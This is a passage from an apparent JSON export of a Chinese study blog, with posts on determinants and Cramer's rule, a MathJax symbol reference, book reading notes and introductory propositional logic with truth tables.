&amp;{\\cdots} &amp; {a{nn}}\\\\end{vmatrix}$,则D等于下面两个行列式的和$\\begin{vmatrix}{a{11}}&amp;{a{21}}&amp;{\\cdots}&amp; a{1i} &amp;{\\cdots}&amp; {a{n1}}\\{a{12}}&amp;{a{22}}&amp;{\\cdots}&amp; a{2i} &amp;{\\cdots} &amp;{a{n2}}\\{\\vdots}&amp;{\\vdots}&amp; &amp;{\\vdots} &amp; &amp; {\\vdots}\\{a{1n}}&amp;{a{2n}}&amp;{\\cdots}&amp; a{ni} &amp;{\\cdots} &amp; {a{nn}}\\\\end{vmatrix} + \\begin{vmatrix}{a{11}}&amp;{a{21}}&amp;{\\cdots}&amp; a’{1i} &amp;{\\cdots}&amp; {a{n1}}\\{a{12}}&amp;{a{22}}&amp;{\\cdots}&amp; a’{2i} &amp;{\\cdots} &amp;{a{n2}}\\{\\vdots}&amp;{\\vdots}&amp; &amp;{\\vdots} &amp; &amp; {\\vdots}\\{a{1n}}&amp;{a{2n}}&amp;{\\cdots}&amp; a’{ni} &amp;{\\cdots} &amp; {a_{nn}}\\\\end{vmatrix}.$ 性质6 把行列式的某一列(行)的各个元素都乘以同一个数字，然后加到另一列(行)对应元素上,行列式不变. 例如以数k乘第j列加到第i列上(记作$c_i+kc_j$),有 \\begin{vmatrix} {a_{11}}&{\\cdots} & {a_{1i}}&{\\cdots}& a_{1j} &{\\cdots}& {a_{1n}}\\\\ {a_{12}}&{\\cdots} & {a_{2i}}&{\\cdots}& a_{2j} &{\\cdots} &{a_{2n}}\\\\ {\\vdots}& & {\\vdots} & &{\\vdots} & {\\vdots}\\\\ {a_{1n}}&{\\cdots} &{a_{ni}}&{\\cdots}& a_{nj} &{\\cdots} & {a_{nn}}\\\\ \\end{vmatrix} \\Longrightarrow{\\text{c_i+kc_j}} \\begin{vmatrix} {a_{11}}&{\\cdots} & ({a_{1i}}+ka_{1j})&{\\cdots}& a_{1j} &{\\cdots}& {a_{1n}}\\\\ {a_{12}}&{\\cdots} & ({a_{2i}}+ka_{2j}) &{\\cdots}& a_{2j} &{\\cdots} &{a_{2n}}\\\\ {\\vdots}& & {\\vdots} & &{\\vdots} & {\\vdots}\\\\ {a_{1n}}&{\\cdots} & ({a_{ni}}+ka_{nj})&{\\cdots}& a_{nj} &{\\cdots} & {a_{nn}}\\\\ \\end{vmatrix} (i\\not=j) 行列式按行(列)展开 一般来说,低阶行列式的计算比高阶行列式的计算简单。自然的我们考虑用低阶行列式来计算高阶行列式。为此，引入余子式和代数余子式的概念。 在n阶行列式中,把(i,j)元$a{ij}$所在的第i行和第j列划去后,留下的n-1阶行列式叫做(i,j)元$a{ij}$的余子式,记做$M{ij}$;记$A{ij}=(-1)^{i+j}M{ij} $,$A{ij}$叫做(i,j)元$a_{ij}$的代数余子式。 引理 一个n阶行列式，如果其中第i行所有元素除(i,j)元$a{ij}$外都为0,那么这个行列式等于$a{ij}$与它的代数余子式的乘积,即:D=$a{ij}A{ij}$。 定理 行列式等于它的任一行(列)的各元素与其对应的代数余子式乘积之和。 范德蒙德行列式 D_n= \\begin{vmatrix} 1 & 1 &{\\cdots}& 1 \\\\ x_1 & x_2 &{\\cdots}& x_n \\\\ x_1^2 & x_2^2 &{\\cdots}& x_n^2 \\\\ {\\vdots}& {\\vdots} & & {\\vdots}\\\\ x_1^{n-1} & x_2^{n-1} &{\\cdots}& x_n^{n-1} \\\\ \\end{vmatrix} = \\prod_{n \\geq i \\geq j \\geq 1} (x_i - x_j)。其中$\\prod$符号表示全体同类因子的乘积。证明:用数学归纳法证明,因为$D2=\\begin{vmatrix}1 &amp; 1 \\x_1 &amp; x_2\\end{vmatrix} = x_2 - x_1 = \\prod{2 \\geq i \\geq j \\geq 1} (x_i - x_j)$。所以当n=2时,上述等式成立。假设上述公式对n-1阶范德蒙德行列式成立。更多证明参考同济线性代数第五版。 推论 行列式某一行(列)的元素与另一行(列)的对应元素的代数余子式乘积之和等于零。 克拉默法则 含有n个未知数$x_1,x_2,x_3…x_n$的n个线性方程组 \\begin{cases} a_{11}x_1+a_{12}x_2+\\cdots+a_{1n}x_n=b_1 \\\\ a_{21}x_1+a_{22}x_2+\\cdots+a_{2n}x_n=b_2 \\\\ \\cdots\\cdots\\\\ a_{n1}x_1+a_{n2}x_2 + \\cdots + a_{nn}x_n=b_n \\end{cases},和二三元线性方程组类似，它的解可以用n阶行列式表示,即有$克拉默法则$。$如果上述线性方程组的系数不为0,即D=\\begin{vmatrix}a{11} &amp; \\cdots &amp; a{1n} \\{\\vdots}&amp; &amp;{\\vdots} \\a{n1} &amp; \\cdots &amp; a{nn}\\end{vmatrix} \\not= 0$,那么方程组有唯一解,$x_1 = \\frac {D_1}{D},x_2=\\frac {D_2}{D},…,x_n = \\frac {D_n}{D} $,其中$D_j(j=1,2,3,…,n)$是把系数行列式D中第j列元素用方程组右端的常数项替代后得到的n阶行列式，即: D_j= \\begin{vmatrix} a_{11} & \\cdots & a_{1.j-1} & b_1 & a_{1.j+1}& \\cdots & a_{1n} \\\\ {\\vdots}& & {\\vdots} & {\\vdots} & {\\vdots} & & {\\vdots} \\\\ a_{n1} & \\cdots & a_{n.j-1} & b_n & a_{n.j+1}&\\cdots & a_{nn} \\end{vmatrix} 参考资料 行列式 同济线性代数第五版","updated":"2020-07-19T00:23:27.985Z","tags":[{"name":"线代","slug":"线代","permalink":"http://xwolf191.github.io/tags/线代/"}]},{"title":"mathjax常用数学符号","date":"2018-07-08T00:45:00.000Z","path":"2018/07/08/开发工具/mathjax常用数学符号/","text":"mathjax 提供了很多数学工具,本篇主要介绍一些常用的数学符号及其写法. 数学符号希腊字母 mathjax 表达式 显示效果 国际音标 \\alpha \\alpha /‘ælfə/ \\beta \\beta /‘bi:tə/或 /‘beɪtə/ \\gamma \\gamma /‘gæmə/ \\Gamma \\Gamma /‘gæmə/ \\digamma \\digamma \\delta \\delta /‘deltə/ \\Delta \\Delta /‘deltə/ \\epsilon \\epsilon /‘epsɪlɒn/ \\varepsilon \\varepsilon \\zeta \\zeta /‘zi:tə/ \\eta \\eta /‘i:tə/ \\theta \\theta /‘θi:tə/ \\Theta \\Theta /‘θi:tə/ \\vartheta \\vartheta \\iota \\iota /aɪ’əʊtə/ \\kappa \\kappa /‘kæpə/ \\varkappa \\varkappa \\lambda \\lambda /‘læmdə/ \\Lambda \\Lambda /‘læmdə/ \\mu \\mu /mju:/ \\nu \\nu /nju:/ \\xi \\xi 希腊 /ksi/ 英美 /ˈzaɪ/ 或 /ˈksaɪ/ \\Xi \\Xi 希腊 /ksi/ 英美 /ˈzaɪ/ 或 /ˈksaɪ/ \\omicron \\omicron /əuˈmaikrən/ 或 /ˈɑmɪˌkrɑn/ \\pi \\pi /paɪ/ \\Pi \\Pi /paɪ/ \\varpi \\varpi \\rho \\rho /rəʊ/ \\varrho \\varrho \\sigma \\sigma /‘sɪɡmə/ \\Sigma \\Sigma /‘sɪɡmə/ \\varsigma \\varsigma \\tau \\tau /tɔ:/ 或 /taʊ/ \\upsilon \\upsilon /ˈipsilon/ 或 /ˈʌpsɨlɒn/ \\Upsilon \\Upsilon /ˈipsilon/ 或 /ˈʌpsɨlɒn/ \\phi \\phi /faɪ/ \\Phi \\Phi /faɪ/ \\varphi \\varphi \\chi \\chi /kaɪ/ \\psi \\psi /psaɪ/ \\Psi \\Psi /psaɪ/ \\omega \\omega /‘əʊmɪɡə/或 /oʊ’meɡə/ \\Omega \\Omega /‘əʊmɪɡə/或 /oʊ’meɡə/ 关系运算符 mathjax 表达式 显示效果 \\mid \\mid \\nmid \\nmid \\cdot \\cdot \\leq \\leq \\geq \\geq \\neq \\neq \\approx \\approx \\equiv \\equiv \\circ \\circ \\ast \\ast \\bigodot \\bigodot \\bigotimes \\bigotimes \\pm \\pm \\times \\times \\div \\div \\sum \\sum \\prod \\prod \\coprod \\coprod 集合运算符 mathjax 表达式 显示效果 \\emptyset \\emptyset \\in \\in \\notin \\notin \\subset \\subset \\supset \\supset \\subseteq \\subseteq \\supseteq \\supseteq \\bigcap \\bigcap \\bigcup \\bigcup \\bigvee \\bigvee \\bigwedge \\bigwedge \\biguplus \\biguplus \\bigsqcup \\bigsqcup 三角函数 mathjax 表达式 显示效果 \\bot \\bot \\angle \\angle \\30^\\circ 30^\\circ \\sin \\sin \\cos \\cos \\tan \\tan \\cot \\cot \\sec \\sec \\csc \\csc 对数运算 mathjax 表达式 显示效果 \\log \\log \\lg \\lg \\ln \\ln 微积分运算 mathjax 表达式 显示效果 \\prime \\prime \\int \\int \\iint \\iint \\iiint \\iiint \\iiiint \\iiiint \\oint \\oint \\lim \\lim \\infty \\infty \\nabla \\nabla \\partial x \\partial x \\mathrm{d}x \\mathrm{d}x \\dot x \\dot x \\ddot y \\ddot y 逻辑运算 mathjax 表达式 显示效果 \\because \\because \\therefore \\therefore \\forall \\forall \\exists \\exists \\not= \\not= \\not&gt; \\not> \\not\\subset \\not\\subset 几何符号 mathjax 表达式 显示效果 \\Diamond \\Diamond \\Box \\Box \\Delta \\Delta \\triangle \\triangle \\angle\\alpha\\beta\\Gamma \\angle\\alpha\\beta\\Gamma \\sin!\\frac{\\pi}{3}=\\sin60^\\circ=\\frac{\\sqrt{3}}{2} \\sin\\!\\frac{\\pi}{3}=\\sin60^\\circ=\\frac{\\sqrt{3}}{2} \\perp \\perp 箭头符号 mathjax 表达式 显示效果 \\uparrow \\uparrow \\downarrow \\downarrow \\Uparrow \\Uparrow \\Downarrow \\Downarrow \\updownarrow \\updownarrow \\Updownarrow \\Updownarrow \\rightarrow \\rightarrow \\leftarrow \\leftarrow \\Rightarrow \\Rightarrow \\Leftarrow \\Leftarrow \\leftrightarrow \\leftrightarrow \\Leftrightarrow \\Leftrightarrow \\longrightarrow \\longrightarrow \\longleftarrow \\longleftarrow \\Longrightarrow \\Longrightarrow \\Longleftarrow \\Longleftarrow \\longleftrightarrow \\longleftrightarrow \\Longleftrightarrow \\Longleftrightarrow \\mapsto \\mapsto \\longmapsto \\longmapsto \\hookleftarrow \\hookleftarrow \\hookrightarrow \\hookrightarrow \\leftharpoonup \\leftharpoonup \\rightharpoonup \\rightharpoonup \\leftharpoondown \\leftharpoondown \\rightharpoondown \\rightharpoondown \\rightleftharpoons \\rightleftharpoons \\nearrow \\nearrow \\leadsto \\leadsto \\searrow \\searrow \\nwarrow \\nwarrow \\dashrightarrow \\dashrightarrow \\dashleftarrow \\dashleftarrow \\curvearrowleft \\curvearrowleft \\circlearrowleft \\circlearrowleft 部分示例 上下标 1y^3 y^31y_3 y_31a_3^2 a_3^21a^&#123;2+2&#125; a^{2+2}1a_&#123;i,j&#125; a_{i,j} 极限 1\\lim\\limits_&#123;x \\to 1&#125; \\frac&#123;x^2-1&#125;&#123;x-1&#125; $\\lim\\limits_{x \\to 1} \\frac{x^2-1}{x-1}$ 导数和微积分 1x&apos; x'1x^\\prime x^\\prime1\\dot&#123;x&#125; \\dot{x}1\\ddot&#123;y&#125; \\ddot{y}1\\int_&#123;-N&#125;^&#123;N&#125; e^x\\, dx \\int_{-N}^{N} e^x\\, dx1\\begin&#123;matrix&#125; \\int_&#123;-N&#125;^&#123;N&#125; e^x\\, dx\\end&#123;matrix&#125; \\begin{matrix} \\int_{-N}^{N} e^x\\, dx\\end{matrix}1\\iint_&#123;D&#125;^&#123;W&#125; \\, dx\\,dy \\iint_{D}^{W} \\, dx\\,dy1\\iiint_&#123;E&#125;^&#123;V&#125; \\, dx\\,dy\\,dz \\iiint_{E}^{V} \\, dx\\,dy\\,dz1\\iiiint_&#123;F&#125;^&#123;U&#125; \\, dx\\,dy\\,dz\\,dt \\iiiint_{F}^{U} \\, dx\\,dy\\,dz\\,dt1\\oint_&#123;C&#125; x^3\\, dx + 4y^2\\, dy \\oint_{C} x^3\\, dx + 4y^2\\, dy 向量 1\\vec&#123;c&#125; \\vec{c}1\\overleftarrow&#123;a b&#125; \\overleftarrow{a b}1\\overrightarrow&#123;c d&#125; \\overrightarrow{c d}1\\widehat&#123;e f g&#125; \\widehat{e f g} 高亮部分 12345 \\bbox[yellow]&#123;e^x=\\lim_&#123;n\\to\\infty&#125; \\left( 1+\\frac&#123;x&#125;&#123;n&#125; \\right)^n\\qquad&#125; { e^x=\\lim_{n\\to\\infty} \\left( 1+\\frac{x}{n} \\right)^n \\qquad }12345\\bbox[yellow,5px,border:2px solid red]&#123;e^x=\\lim_&#123;n\\to\\infty&#125; \\left( 1+\\frac&#123;x&#125;&#123;n&#125; \\right)^n\\qquad (1)&#125; { e^x=\\lim_{n\\to\\infty} \\left( 1+\\frac{x}{n} \\right)^n \\qquad (1) } 方程组 12345\\begin&#123;cases&#125;a_1x+b_1y+c_1z=d_1\\\\a_2x+b_2y+c_2z=d_2\\\\a_3x+b_3y+c_3z=d_3\\\\\\end&#123;cases&#125; \\begin{cases} a_1x+b_1y+c_1z=d_1\\\\ a_2x+b_2y+c_2z=d_2\\\\ a_3x+b_3y+c_3z=d_3\\\\ \\end{cases}1234567\\left\\&#123;\\begin&#123;aligned&#125; a_1x+b_1y+c_1z &amp;=d_1+e_1 \\\\ a_2x+b_2y&amp;=d_2 \\\\ a_3x+b_3y+c_3z &amp;=d_3 \\end&#123;aligned&#125; \\right. \\left\\{ \\begin{aligned} a_1x+b_1y+c_1z &=d_1+e_1 \\\\ a_2x+b_2y&=d_2 \\\\ a_3x+b_3y+c_3z &=d_3 \\end{aligned} \\right. 除法 12345678\\require&#123;enclose&#125;\\begin&#123;array&#125;&#123;r&#125; 13 \\\\[-3pt]4 \\enclose&#123;longdiv&#125;&#123;52&#125; \\\\[-3pt] \\underline&#123;4&#125;\\phantom&#123;2&#125; \\\\[-3pt] 12 \\\\[-3pt] \\underline&#123;12&#125;\\end&#123;array&#125; \\require{enclose} \\begin{array}{r} 13 \\\\[-3pt] 4 \\enclose{longdiv}{52} \\\\[-3pt] \\underline{4}\\phantom{2} \\\\[-3pt] 12 \\\\[-3pt] \\underline{12} \\end{array} 求和 123\\sum_&#123;n=1&#125;^\\infty \\frac&#123;1&#125;&#123;n^2&#125; \\to \\textstyle \\sum_&#123;n=1&#125;^\\infty \\frac&#123;1&#125;&#123;n^2&#125; \\to \\displaystyle \\sum_&#123;n=1&#125;^\\infty \\frac&#123;1&#125;&#123;n^2&#125; \\textstyle \\sum_{n=1}^\\infty \\frac{1}{n^2} \\to \\displaystyle \\sum_{n=1}^\\infty \\frac{1}{n^2} 矩阵 123456在起始、结束标记处用下列词替换 matrix:pmatrix：小括号边框 ,例如 ()bmatrix：中括号边框, 例如 []Bmatrix：大括号边框,例如 &#123;&#125;vmatrix：单竖线边框,例如 ||Vmatrix：双竖线边框,例如 ∥∥ 123456\\begin&#123;bmatrix&#125;1 &amp; 2 &amp; 2 \\\\2 &amp; 3 &amp; 4 \\\\4 &amp; 4 &amp; 2\\end&#123;bmatrix&#125; \\begin{bmatrix} 1 & 2 & 2 \\\\ 2 & 3 & 4 \\\\ 4 & 4 & 2 \\end{bmatrix}横省略号：\\cdots,例如 ⋯⋯竖省略号：\\vdots,例如 ⋮⋮斜省略号：\\ddots,例如 ⋱ 123456\\begin&#123;bmatrix&#125;&#123;a_&#123;11&#125;&#125;&amp;&#123;a_&#123;12&#125;&#125;&amp;&#123;\\cdots&#125;&amp;&#123;a_&#123;1n&#125;&#125;\\\\&#123;a_&#123;21&#125;&#125;&amp;&#123;a_&#123;22&#125;&#125;&amp;&#123;\\cdots&#125;&amp;&#123;a_&#123;2n&#125;&#125;\\\\&#123;\\vdots&#125;&amp;&#123;\\vdots&#125;&amp;&#123;\\cdots&#125;&amp;&#123;\\vdots&#125;\\\\&#123;a_&#123;m1&#125;&#125;&amp;&#123;a_&#123;m2&#125;&#125;&amp;&#123;\\cdots&#125;&amp;&#123;a_&#123;mn&#125;&#125;\\\\\\end&#123;bmatrix&#125; \\begin{bmatrix} {a_{11}}&{a_{12}}&{\\cdots}&{a_{1n}}\\\\ {a_{21}}&{a_{22}}&{\\cdots}&{a_{2n}}\\\\ {\\vdots}&{\\vdots}&{\\cdots}&{\\vdots}\\\\ {a_{m1}}&{a_{m2}}&{\\cdots}&{a_{mn}}\\\\ \\end{bmatrix} 小数及单位 14321.1234 4321.1234154\\,321.123\\,45 54321.12345 54\\,321.123\\,45 54321.123451\\mathrm&#123;e&#125;\\,6 \\mathrm{e}\\,61\\mathrm&#123;kg&#125; \\mathrm{kg}1\\mathrm&#123;m&#125;/\\mathrm&#123;s&#125;^2 \\mathrm{m}/\\mathrm{s}^21\\mathrm&#123;kg&#125;\\!\\cdot\\!\\mathrm&#123;m&#125;^2 /\\left(\\mathrm&#123;C&#125;\\!\\cdot\\!\\mathrm&#123;s&#125;\\right) \\mathrm{kg}\\!\\cdot\\!\\mathrm{m}^2 /\\left(\\mathrm{C}\\!\\cdot\\!\\mathrm{s}\\right)1N_A = 6.022\\times10^&#123;23&#125; \\ \\mathrm&#123;mol&#125;^&#123;-1&#125; N_A = 6.022\\times10^{23} \\ \\mathrm{mol}^{-1} 参考资料 LaTex 各种命令、符号 MathJax basic tutorial and quick reference","updated":"2020-07-19T00:23:27.972Z","tags":[{"name":"latex","slug":"latex","permalink":"http://xwolf191.github.io/tags/latex/"}]},{"title":"东京一年","date":"2018-07-04T01:00:00.000Z","path":"2018/07/04/读书笔记/东京一年/","text":"作者简介 蒋方舟，1989年出生于湖北襄阳。7岁开始写作，9岁写成散文集《打开天窗》。2008年被清华大学破格录取，次年在《人民文学》发表了《审判童年》，“将戏谑的口吻与犀利的质问、游戏的精神与坦诚的剖析熔于一炉”，获得第一届朱自清散文奖。2012年大学毕业后任《新周刊》副主编。代表作：杂文集《正在发育》《邪童正史》《我承认我不曾历经沧桑》、小说集《故事的结局早已写在开头》等。蒋方舟的写作展示了对自身和“被时代绑架的一代年轻人”的关切。 伊藤王树，1978年出生于日本，纪录片导演，作品曾获艾美奖提名。执导的《15岁离开家乡的歌》（冲绳少女离开故乡的故事）等纪录片陆续在日本上映。 读后感 作者读的书很多,很多书尤其是日本人的书几乎都没有听过.着重看了关于日本性文化的描述,可能偷偷摸摸看的小电影都是真的。作者以日记体的形式写出来,第一次读这种类型的书，略显新奇.","updated":"2020-07-19T00:23:28.439Z","tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://xwolf191.github.io/tags/读书笔记/"}]},{"title":"知乎周刊--人工智能:像人一样思考？","date":"2018-06-28T01:00:00.000Z","path":"2018/06/28/读书笔记/知乎周刊人工智能像人一样思考/","text":"「人工智能」，这个曾经很遥远很未来的概念，正逐渐在我们的生活中刷遍存在感。有人从中看到了「千亿的未来」，谷歌、Facebook、微软等互联网巨头不惜重金收购人工智能公司，发展人工智能实验室；也有人担心自己所处的行业被人工智能取代，甚至预言更多隐患。而你，又看到了什么？本期周刊，听知乎上的科研人员、从业者和爱好者聊聊人工智能，从可以触摸的真实的现在，看见未来。愿你收获从未知到已知的喜悦。 目录 人工智能：像人一样思考？ 电脑和人类的围棋对决 如何看待 Google 围棋 AI AlphaGo 击败欧洲围棋冠军？ 围棋作为唯一一种电脑下不赢人的大众棋类，是何原因导致？以及量子计算机出现后有无可能？ 如何评价 Nature 重磅封面：谷歌人工智能击败欧洲围棋冠军，3 月将与李世乭对弈？ 通往超级智能之路 为什么最近有很多名人，比如比尔盖茨、马斯克、霍金等，让人们警惕人工智能？ 神经网络是什么 如何简单形象又有趣地讲解神经网络是什么？ 机器人有没有变厉害，要看你怎么定义 为什么机器人研究了几十年，还是给人感觉没有太大进展？ 未来，司机会被取代吗？ Google 无人驾驶汽车的发布意味着什么？ 谷歌智能车的难点在哪里？模式识别，还是分析、控制算法？ 人工智能可以作曲吗？ 机器人如何影响着设计产业 机器人对设计学科（包括建筑学）有什么影响？ 自动驾驶时代，人可以做什么？ 自动驾驶技术日渐成熟的背景下会带来哪些创业机会？ 人类的智能是好的智能吗？ 人类的智能是一个好的智能吗？ 研究人工智能会让我们更了解自己吗？ 对机器人或人工智能的研究会帮助我们更好地了解人类自己吗？ 读后感对人工智能有部分理解,背后的数学、统计学知识异常丰富。感叹于科技的力量,自动驾驶、模式识别、人脸识别、机器人等等…知道了部分算法、概念,蒙特卡罗算法、隐马尔可夫随机场、决策树等等.把数学知识学习一下,准备试水深度学习…","updated":"2020-07-19T00:23:28.458Z","tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://xwolf191.github.io/tags/读书笔记/"}]},{"title":"八堂极简科学课","date":"2018-06-23T01:00:00.000Z","path":"2018/06/23/读书笔记/八堂极简科学课/","text":"八堂极简科学课 作者: 本•米勒 (Ben Miller) 内容简介本•米勒用轻松幽默的语言，引领读者走进奇妙的科学世界，汇成人人都看得懂、都爱看的八堂极简科学课——DNA造物密码、黑洞之谜、宇宙大爆炸、美食的奥秘美拉德反应、探索外星人等。作者以兴趣为导向，将众多耳熟能详又知之甚少的重大科学理论娓娓道来，为读者展开一段段妙趣横生的科学史话。没有拗口的术语和枯燥的论证，只有诙谐的叙述和生动的比喻，带你轻松越过重重障碍，感受科学之美！ 作者简介本•米勒（Ben Miller）狂热的科学爱好者，曾于剑桥大学攻读物理学博士，英国《泰晤士报》科学专栏作家，BBC喜剧明星，“憨豆特工”搭档演员，国际知名导演、编剧和制片人，曾获第63届英国电影和电视艺术学院奖等多项大奖。米勒结合科学与艺术两种卓越的能力和天赋，用轻松幽默的语言，理清深奥难懂的科学术语和理论，同时又不失科学的权威。还著有《外星人来了！》等科普书。 目录第1课 趣味科学初体验1 人真的是由星尘组成的3 好玩的数学9 科学世界是懒人创造的11 从一道剑桥大学入学面试题说起12 量子效应能吸引你整夜泡在实验室14 让霍金开怀大笑的科学脱口秀17 抛开基础知识，从有趣的科学讲起 第二课 量子物理世界的奥秘21 你的所有一切都由夸克组成22 令人振奋的大型强子对撞机24 目睹世界最大的科学实验中枢25 寻找上帝粒子28 对撞机的把戏——把能量转换成物质30 大型强子对撞机能制造出黑洞？31 宇宙射线的震撼能量33 如何分辨伪科学35 奇异又美妙的黑洞37 场论与玄论之争38 规范场论要有例子证明39 弦理论寻找N维时空41 反物质和大爆炸42 正物质与反物质，天使与魔鬼44 婴儿宇宙是些团块45 宇宙未解之谜 第三课 广义相对论的宇宙和时空47 谁都可以参与的“观星派对”48 迈出天文学的第1步49 夜里最容易看到的三颗行星51 夜空甜点——卫星、流星和彗星52 饱览太阳系的焰火表演53 你杯子里的水可能来自火星54 来自遥远星球的消息55 你不知道的十二星座57 婴儿恒星是这样诞生的57 独具特色的蓝、白、红色三颗恒星59 红矮星“隐身”之谜60 教你准确找到恒星62 蓝色恒星都是大块头63 超级恒星的悲惨命运64 X光谱66 天鹅的黑暗之心67 我们在银河系的盘子里69 自学成才的天文望远镜之父71 夜空为什么是黑的而不是白的72 爱因斯坦的时运73 相对论用于处理大事物73 广义相对论的理论基础74 时空转换76 空间是所有一切的驱动力77 我们正掉进黑洞里78 亲临一次末日之旅吧80 与成功的理论交手 第四课 生命源起和进化论81 友善对待外星人82 理论，假说和预感83 物种起源游戏86 新物种更能适应新环境87 进化论与适应能力88 进化论的由来89 良好的遗传基因91 具有革命性的理论92 石头说出的真相93 一切都在循环之中94 岩石也在不停循环96 花岗岩上的故事98 成为化石好艰难99 你的祖先是条鱼101 我们来得太迟了103 解开自身起源的秘密106 奥妙都在基因之中 第五章 揭开DNA的造物密码109 携带信息的DNA111 蛋白质，生命存活的关键113 绘制基因组115 线粒体夏娃和Y染色体亚当117 伟大的线粒体117 黑猩猩时钟119 回到伊甸园120 性别战争122 异时空之恋123 转基因的优势——基因变异带来的好处126 乳糖酶的作用127 乳糖酶基因LCT的奥秘130 基因组的语言 第六课 美味奥秘——美拉德反应135 厨房噩梦136 烹饪中的化学137 多情的原子138 人体内的催化剂——酶139 能干的酶140 美味奥秘——美拉德反应142 味蕾的语言很妙143 味道与气味的奇妙碰撞144 让人眼馋的焦黄色145 蛋糕制作中的化学原理147 用科学实验增添生活趣味150 科学的蛋糕烘焙技巧152 烘焙里的科学原理154 我的健康饮食法156 美食大挑战 第七章 气候变迁159 难以忽视的气候问题160 冰河世纪161 气候变迁并不恐怖162 四季变幻如此美妙164 温室效应元凶166 地球表面温度变化169 泰晤士河上的冰上集市171 中世纪温暖时期和小冰期173 时冷时热的太阳174 聊聊太阳黑子175 太阳上也有气候178 星期三的火山灰179 火山爆发气候变冷180 地球越来越热180 发现喷射气流181 平流层航空飞行182 热平衡世界184 蝴蝶效应184 鸟瞰地球天气系统185 地球上的大气循环186 厄尼尔诺现象187 给你介绍一个气候模型189 别怕，应对气候变化是我们的专长 第八课 探索外星文明191 外星人在太空等你193 送你上太空194 站在巨人的肩膀上196 运动并不需要受力197 加速则需要力199 力，总是成对出现的199 物体之间相互吸引200 科学真的没那么高精尖203 火箭侠204 登月的证明207 与月球亲密接触208 用面包屑做成的房子211 寻找可能性212 寻找外星智慧213 如何计算外星人的数量216 E.T.不给任何人打电话217 外星人都到哪儿去了？扩展阅读 /219 读后感 都是借助上下班时间在地铁上看的,算是复习了一下初高中地理、物理知识.看到牛顿、爱因斯坦等还是如此的熟悉又陌生.个人对未知的世界比较感兴趣,对恐龙时代也比较感兴趣.惊讶于一个10公里的陨石让白垩纪时期的恐龙灭绝。对地外文明充满好奇,到底有没有外星人？长什么样子？看完有一些收获。竟然有具体的公式来计算宇宙中宜居星球的数量,惊叹于大自然的神奇,惊叹于科学的力量。","updated":"2020-07-19T00:23:28.440Z","tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://xwolf191.github.io/tags/读书笔记/"}]},{"title":"离散数学(一)、基础:逻辑和证明","date":"2018-06-19T01:00:00.000Z","path":"2018/06/19/数学/离散数学一基础逻辑和证明/","text":"离散数学（英语：Discrete mathematics）是数学的几个分支的总称，研究基于离散空间而不是连续的数学结构。与连续变化的实数不同，离散数学的研究对象——例如整数、图和数学逻辑中的命题——不是连续变化的，而是拥有不等、分立的值。因此离散数学不包含微积分和分析等“连续数学”的内容。离散对象经常可以用整数来枚举。更一般地，离散数学被视为处理可数集合（与整数子集基数相同的集合，包括有理数集但不包括实数集）的数学分支。但是，“离散数学”不存在准确且普遍认可的定义。实际上，离散数学经常被定义为不包含连续变化量及相关概念的数学，甚少被定义为包含什么内容的数学。 离散数学中的对象集合可以是有限或者是无限的。有限数学一词通常指代离散数学处理有限集合的那些部分，特别是在与商业相关的领域。 随着计算机科学的飞速发展，离散数学的重要性则日益彰显。它为许多信息学课程提供了数学基础，包括数据结构、算法、数据库理论、形式语言与操作系统等。如果没有离散数学的相关数学基础，学生在学习上述课程中，便会遇到较多的困难。此外，离散数学也包含了解决作业研究、化学、工程学、生物学等众多领域的数学背景。由于运算对象是离散的，所以计算机科学的数学基础基本上也是离散的。我们可以说计算机科学的数学语言就是离散数学。人们会使用离散数学里面的槪念和表示方法，来研究和描述计算机科学下所有分支的对象和问题，如计算机运算、编程语言、密码学、自动定理证明和软件开发等。相反地，计算机的应用使离散数学的概念得以应用于日常生活当中（如运筹学）。 虽然离散数学的主要研究对象是离散对象，但是连续数学的分析方法往往也可以采用。数论就是离散和连续数学的交叉学科。同样的，有限拓扑（对有限拓扑空间的研究）从字面上可看作离散化和拓扑的交集。 — 维基百科 命题逻辑命题 命题是一个或真或假的陈述语句.既是一个陈述事实的句子,或真或假。 看下边几个语句: 北京是中国首都. 几点了？ 1+1=2. x+1=2. 2+1=2. 其中1,3为真命题,5为假命题。2不是命题，因为它不是陈述语句。4不是命题，它不是真，也不是假。 我们用字母p、q、r…等来表示命题.如果一个命题为真命题,它的真值为真，用T表示;如果它的命题为假,其真值为假，用F表示. 涉及命题的逻辑领域称为命题演算或命题逻辑。 定义1 若p为一命题,则p的否定命题为¬p,读作非p. 定义2 若p和q为命题。p和q的合取用p∧q表示,既命题p并且q。当p和q都为真时,命题p∧q为真,否则为假。 p∧q的真值表: p q p∧q F F F F T F T F F T T T 定义3 若p和q为命题。p和q的析取用p∨q表示,既命题p或q。当p和q都为假时,命题p∨q为假,否则为真。 p∨q的真值表: p q p∨q F F F F T T T F T T T T 定义4 若p和q为命题。p和q的异或用p⊕q表示。当p和q有一个为真时,命题p⊕q为真,否则为假。 p⊕q的真值表: p q p⊕q F F F F T T T F T T T F 条件语句定义5令p和q为命题.条件语句p→q是命题“若p，则q”。当p为真而q为假时，条件语句p→q为假，否则为真。在条件语句p→q中，p称为假设(或前项、前提)，q称为结论(或推论)。称语句p→q为条件语句，是因为p→q可以断定在条件p成立的时候q为真。条件语句也称为蕴含。 p-&gt;q的真值表: p q p->q F F T F T T T F F T T T 定义6 令p和q为命题。双条件语句p &lt;-&gt; q是命题“p当且仅当q”。当p和q有同样的真值时，双条件语句为真，否则为假。双条件语句也称为双蕴含。 p&lt;-&gt;q的真值表: p q pq F F T F T F T F F T T T 构造复合命题(P∨Q) -&gt; (Q∧R) 的真值表 P Q R P∨Q Q∧R (P∨Q) -> (Q∧R) 0 0 0 0 0 1 0 0 1 0 0 1 0 1 0 1 0 0 0 1 1 1 1 1 1 0 0 1 0 0 1 0 1 1 0 0 1 1 0 1 0 0 1 1 1 1 1 1 逻辑运算符的优先级 运算符 优先级 ¬ 1 ∧ 2 ∨ 3 -> 4 5 翻译语句 把下面句子翻译为逻辑表达式. “除非你已满16周岁，否则只要你身高不足4英尺θ就不能乘公园滑行铁道游乐车。” 令q、r和s分别表示“你能乘公园滑行铁道游乐车”、“你身高不足4英尺”和“你已满16周岁”，则上述句子可以翻译为(r∧¬s)→¬q. 命题等价定义1 复合命题称为永真式(或重言式)， 如果无论其中出现的命题的真值是什么，它的真值总是真。真值永远为假的复合命题称为矛盾。最后，既不是永真式又不是矛盾的命题称为可能式。 定义2 